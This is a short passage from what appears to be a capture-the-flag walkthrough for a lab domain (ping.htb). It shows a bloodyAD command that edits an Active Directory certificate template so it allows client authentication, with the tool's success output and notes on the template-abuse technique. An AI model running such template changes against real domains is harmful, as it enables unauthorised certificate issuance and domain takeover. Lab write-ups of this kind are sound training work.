❯❯❯ faketime -f +8h bloodyAD --host dc1.ping.htb -d pong.htb -k set object "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb" pKIExtendedKeyUsage -v "1.3.6.1.5.5.7.3.2"            
[+] CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb's pKIExtendedKeyUsage has been updated
```

The first sets `Enrollee Supplies Subject` to true

And the second allows for client authentication





